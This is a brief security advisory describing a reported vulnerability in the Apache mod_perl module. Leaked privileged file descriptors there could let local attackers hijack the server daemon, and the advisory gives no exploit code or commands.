A vulnerability has been reported to exist in the Apache mod_perl module that may allow local attackers to gain access to privileged file descriptors. This issue could be exploited by an attacker to hijack a vulnerable server daemon. Other attacks are also possible.

It has been reported that multiple file descriptors, are leaked to the mod_perl module and any processes it creates. This allows for Perl scripts and any processes they spawn to access the privileged I/O streams.
